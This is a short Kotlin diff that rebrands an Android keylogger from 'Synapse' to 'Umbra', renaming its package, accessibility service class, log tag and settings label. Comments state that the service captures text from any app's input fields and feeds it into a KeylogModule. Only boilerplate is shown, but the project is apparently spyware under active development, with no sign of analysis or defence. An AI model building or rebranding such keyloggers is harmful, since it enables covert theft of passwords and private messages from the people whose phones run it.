@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.accessibilityservice.AccessibilityService
 import android.util.Log
@@ -9,12 +9,12 @@ import android.view.accessibility.AccessibilityEvent
  * from any app's input fields. Feeds into KeylogModule.
  *
  * MUST be manually enabled by user in:
- * Settings → Accessibility → Synapse Keylogger
+ * Settings → Accessibility → Umbra Keylogger
  */
-class SynapseAccessibilityService : AccessibilityService() {
+class UmbraAccessibilityService : AccessibilityService() {
 
     companion object {
-        private const val TAG = "Synapse.Accessibility"
+        private const val TAG = "Umbra.Accessibility"
     }
 
     override fun onServiceConnected() {
